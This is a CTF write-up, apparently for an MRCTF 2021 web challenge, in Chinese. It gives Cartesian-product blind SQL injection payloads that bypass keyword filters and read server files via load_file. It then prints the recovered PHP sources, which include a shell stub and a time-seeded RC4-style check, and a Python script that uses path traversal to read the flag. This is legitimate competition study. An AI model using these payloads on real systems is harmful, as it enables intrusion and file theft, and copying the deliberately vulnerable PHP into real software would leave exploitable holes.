笛卡尔积盲注：

    payload="admin'||(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema like database())),{},1))<{})||((SeLECT+count(*) FROM information_schema.columns A,information_schema.columns B))-''--+"

过滤了and,>,=。
注出了用户名密码发现并没有用，这里实际上是要注出sum.php,hint.php,shell.php三个文件：

    payload="admin'||(ascii(substr((select(load_file(0x2f7661722f7777772f68746d6c2f7368656c6c2e706870))),{},1))<{})||((SeLECT count(*) FROM information_schema.columns A, information_schema.columns B))--+"

shell.php:
    
    <?php
    if($_POST['M2cTf']){
        mrctf($_POST['M2cTf']);
    }

hint.php:
    
    <?php
    require "sum.php";
    $check = $_POST['check'];
    $command = $_POST['command'];
    
    if ($check == enc("MRCTF2021")){
        if (strlen($command < 5)){
            $path = "/proc/self/".$command;
            $myfile = fopen($path,"r") or die("Unable to open file!");
            echo fread($myfile,400000);
            fclose($myfile);
        }
    
    }

sum.php:
    
    <?php
    date_default_timezone_set('GMT');
    $time = time();
    function rand_md($data){
        $data = $data * 11980 + 12345;
        $data = $data << 4;
        return (string)($data) ;
    }
    
    function enc ($data)
    {
    
        $pwd = substr(rand_md(intval(time()/2)),-6,6);
        $key[] ="";
        $box[] ="";
        $pwd_length = 4;
        $data_length = strlen($data);
        $pwd = substr($pwd,3,7);
        for ($i = 0; $i < 256; $i++)
        {
            $key[$i] = ord($pwd[$i % $pwd_length]);
            $box[$i] = $i;
        }
        for ($j = $i = 0; $i < 256; $i++)
        {
            $j = ($j + $box[$i] + $key[$i]) % 256;
            $tmp = $box[$i];
            $box[$i] = $box[$j];
            $box[$j] = $tmp;
        }
        for ($a = $j = $i = 0; $i < $data_length; $i++)
        {
            $a = ($a + 1) % 256;
            $j = ($j + $box[$a]) % 256;
            $tmp = $box[$a];
            $box[$a] = $box[$j];
            $box[$j] = $tmp;
            $k = $box[(($box[$a] + $box[$j]) % 256)];
            $cipher .= chr(ord($data[$i]) ^ $k);
        }
        $cipher = base64_encode($cipher);
        return $cipher;
    }

sum.php这里是个伪随机数，在自己VPS上搭一个就行。
hint.php中strlen函数写得有点奇怪，直接令command为../../../../../../flag即可读取flag：

    import requests
    
    url1 = "http://xxxxxxx.com/test/sum.php"//自己搭一个sum.php
    r = requests.get(url=url1)
    check1 = r.text
    url2 = "http://node.mrctf.fun:10023/hint.php"
    data = {"check":check1,
            "command":"../../../../../../flag"
            }
    print(data)
    r1 = requests.post(url=url2,data=data)
    print(r1.text)

